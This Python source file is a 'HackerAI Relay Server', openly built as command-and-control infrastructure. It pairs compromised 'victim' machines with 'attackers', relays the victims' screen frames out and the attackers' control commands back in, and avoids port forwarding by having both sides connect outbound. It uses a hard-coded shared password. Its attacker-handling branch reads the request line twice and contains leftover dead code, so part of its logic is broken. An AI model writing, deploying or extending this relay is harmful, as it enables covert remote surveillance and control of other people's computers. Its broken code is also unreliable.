#!/usr/bin/env python3
"""
HackerAI Relay Server v1.0
- TCP server that relays screen data and control commands
- BOTH victim and attacker connect OUTBOUND to this server
- No port forwarding needed on either side
"""

import socket
import threading
import struct
import json
import time
import os
import sys
import argparse

# ─── Configuration ────────────────────────────────────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 5657
SHARED_PASSWORD = "hackerai2024"

# ─── Pairing Store ────────────────────────────────────────────────────────────
waiting_victims = {}       # hostname -> socket
waiting_victims_lock = threading.Lock()


def log(msg, level="INFO"):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}")


def handle_victim(conn, addr, hostname):
    """Handle a victim connection — wait for attacker to pair."""
    log(f"Victim '{hostname}' connected from {addr[0]}:{addr[1]}", "VICTIM")

    with waiting_victims_lock:
        # If there's already a victim with this hostname, disconnect the old one
        if hostname in waiting_victims:
            try:
                waiting_victims[hostname].close()
            except:
                pass
        waiting_victims[hostname] = conn

    try:
        # Tell victim to wait
        conn.sendall(b"WAITING\n")

        # Wait for a paired message (set by attacker handler)
        # We'll use a simple approach: the attacker handler will find us
        # and write "PAIRED" to the victim socket
        while True:
            try:
                data = conn.recv(1)
                if not data:
                    break
            except:
                break

    except:
        pass
    finally:
        with waiting_victims_lock:
            if hostname in waiting_victims and waiting_victims[hostname] == conn:
                del waiting_victims[hostname]
        try:
            conn.close()
        except:
            pass
        log(f"Victim '{hostname}' disconnected", "DISCONNECT")


def handle_attacker(conn, addr):
    """Handle an attacker connection — connect to victim and pipe data."""
    log(f"Attacker connected from {addr[0]}:{addr[1]}", "ATTACKER")

    try:
        # Read attacker's request (JSON line)
        data = b""
        while True:
            ch = conn.recv(1)
            if not ch or ch == b"\n":
                break
            data += ch

        request = json.loads(data.decode())
        target_hostname = request.get("hostname", "")
        password = request.get("password", "")

        if password != SHARED_PASSWORD:
            conn.sendall(b"ERROR:Bad password\n")
            conn.close()
            return

        if not target_hostname:
            conn.sendall(b"ERROR:No hostname specified\n")
            conn.close()
            return

        log(f"Attacker wants to connect to '{target_hostname}'", "PAIRING")

        # Find the victim
        victim_conn = None
        with waiting_victims_lock:
            if target_hostname in waiting_victims:
                victim_conn = waiting_victims.pop(target_hostname)

        if not victim_conn:
            conn.sendall(f"ERROR:Victim '{target_hostname}' not found online\n".encode())
            conn.close()
            return

        # Tell both sides they're paired
        try:
            victim_conn.sendall(b"PAIRED\n")
            conn.sendall(b"PAIRED\n")
        except:
            log("Failed to notify sides", "ERROR")
            conn.close()
            try:
                victim_conn.close()
            except:
                pass
            return

        log(f"PAIRED: Attacker {addr[0]} <-> Victim '{target_hostname}'", "PAIRED")

        # Now pipe data between the two sockets in both directions
        # Victim -> Attacker: screen frames (and victim sends control responses)
        # Attacker -> Victim: control commands

        def pipe(sock_from, sock_to, direction_name):
            """Pipe data from one socket to another."""
            try:
                while True:
                    data = sock_from.recv(65536)
                    if not data:
                        break
                    sock_to.sendall(data)
            except:
                pass
            finally:
                log(f"Pipe closed: {direction_name}", "PIPE")

        # Create two directional pipes
        t1 = threading.Thread(target=pipe, args=(victim_conn, conn, "victim→attacker"), daemon=True)
        t2 = threading.Thread(target=pipe, args=(conn, victim_conn, "attacker→victim"), daemon=True)
        t1.start()
        t2.start()

        # Wait for either pipe to finish
        t1.join()
        t2.join()

        log(f"Disconnected: Attacker <-> '{target_hostname}'", "DISCONNECT")

    except json.JSONDecodeError:
        conn.sendall(b"ERROR:Invalid JSON\n")
    except Exception as e:
        log(f"Attacker handler error: {e}", "ERROR")
    finally:
        try:
            conn.close()
        except:
            pass


def start_relay_server(host, port):
    """Start the TCP relay server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(50)
    server.settimeout(1.0)

    print(f"""
╔══════════════════════════════════════════════════╗
║       HackerAI Relay Server v1.0                 ║
║       Screen data relay + control proxy          ║
╠══════════════════════════════════════════════════╣
║  Listening on: {host}:{port:<23}║
║  Password: {SHARED_PASSWORD:<35}║
╚══════════════════════════════════════════════════╝
    """)
    print("Waiting for victims and attackers...")
    print()

    while True:
        try:
            conn, addr = server.accept()
            # Set a timeout for initial identification
            conn.settimeout(10.0)

            # Read the first line to identify if this is victim or attacker
            try:
                data = b""
                while True:
                    ch = conn.recv(1)
                    if not ch or ch == b"\n":
                        break
                    data += ch

                identity = data.decode()
            except socket.timeout:
                conn.close()
                continue

            conn.settimeout(None)

            if identity.startswith("VICTIM:"):
                # Format: VICTIM:hostname:password
                parts = identity.split(":", 2)
                if len(parts) >= 3:
                    hostname = parts[1]
                    password = parts[2]
                    if password != SHARED_PASSWORD:
                        conn.sendall(b"ERROR:Bad password\n")
                        conn.close()
                    else:
                        threading.Thread(target=handle_victim, args=(conn, addr, hostname), daemon=True).start()
                else:
                    conn.sendall(b"ERROR:Invalid victim format\n")
                    conn.close()

            elif identity.startswith("ATTACKER:"):
                # Read the rest as JSON
                rest = b""
                while True:
                    ch = conn.recv(1)
                    if not ch or ch == b"\n":
                        break
                    rest += ch
                full = identity + "\n" + rest.decode()
                # Reconstruct
                import io as io2
                # Actually, let's just read the full line differently
                # We already read the first line. The attacker sends:
                # ATTACKER:\n{"hostname":"...","password":"..."}\n
                # But our initial read loop already consumed up to the first \n
                # So identity = "ATTACKER:" and we need to read the JSON line
                json_line = identity
                if json_line == "ATTACKER:":
                    # Read the JSON line
                    json_data = b""
                    while True:
                        ch = conn.recv(1)
                        if not ch or ch == b"\n":
                            break
                        json_data += ch
                    json_line = json_data.decode()

                # Re-parse
                try:
                    json.loads(json_line)  # Validate
                    # Create a whole message with the hostname from JSON
                    threading.Thread(target=handle_attacker, args=(conn, addr), daemon=True).start()
                except:
                    conn.sendall(b"ERROR:Invalid attacker JSON\n")
                    conn.close()
            else:
                conn.sendall(b"ERROR:Unknown identity\n")
                conn.close()

        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("\n[SHUTDOWN] Relay server stopping...")
            break
        except Exception as e:
            log(f"Accept error: {e}", "ERROR")

    server.close()


# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HackerAI Relay Server")
    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
    args = parser.parse_args()

    start_relay_server(args.host, args.port)
